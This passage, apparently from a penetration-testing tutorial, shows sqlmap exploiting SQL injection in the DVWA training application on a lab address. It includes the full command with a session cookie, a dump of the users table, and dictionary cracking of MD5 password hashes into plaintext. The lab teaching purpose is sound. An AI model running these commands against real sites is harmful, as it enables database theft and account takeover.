```
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5
banner: '5.0.51a-3ubuntu5'
[02:51:35] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.33.31'
```

As you can see, both options came back with MySQL 5.0.51. Sqlmap makes it really easy to glean this type of information, as well as other information, all because of an SQL injection attack and a poorly coded web application. But I typically run one more option for sqlmap, and that is the -dump option, which will dump out the specified db table entries if specified. Since I will not be specifying the current DB, it will use the current one that the application is using. Let's see what will come of this option.

```
root@pi-kali:~# sqlmap -u "http://192.168.33.31/dvwa/vulnerabilities/sqli/?id=user&Submit=Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" --dump
```

```
[03:09:22] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:09:22] [INFO] fetching current database
[03:09:23] [WARNING] reflective value(s) found and filtering out
[03:09:23] [INFO] fetching tables for database: 'dvwa'
[03:09:23] [INFO] fetching columns for table 'users' in database 'dvwa'
[03:09:23] [INFO] fetching entries for table 'users' in database 'dvwa'
[03:09:23] [INFO] analyzing table dump for possible password hashes
[03:09:23] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[03:09:28] [INFO] writing hashes to a temporary file '/tmp/sqlmapJiEVrD21383/sqlmaphashes-pJvsGN.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:09:33] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[03:09:37] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[03:09:39] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[03:09:39] [INFO] starting 4 processes
[03:09:53] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
[03:10:02] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[03:10:18] [INFO] cracked password 'letmein' for hash
```